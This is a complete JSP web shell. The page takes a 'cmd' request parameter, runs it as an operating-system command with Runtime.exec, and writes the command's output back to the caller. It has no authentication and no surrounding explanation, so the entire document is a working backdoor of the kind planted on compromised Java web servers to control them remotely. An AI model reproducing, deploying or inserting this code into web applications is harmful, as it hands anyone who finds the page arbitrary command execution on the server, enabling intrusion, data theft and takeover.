<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = response.getOutputStream();
    InputStream in = p.getInputStream();
    int a = -1;
    while((a=in.read())!=-1){
        os.write(a);
    }
}
%>
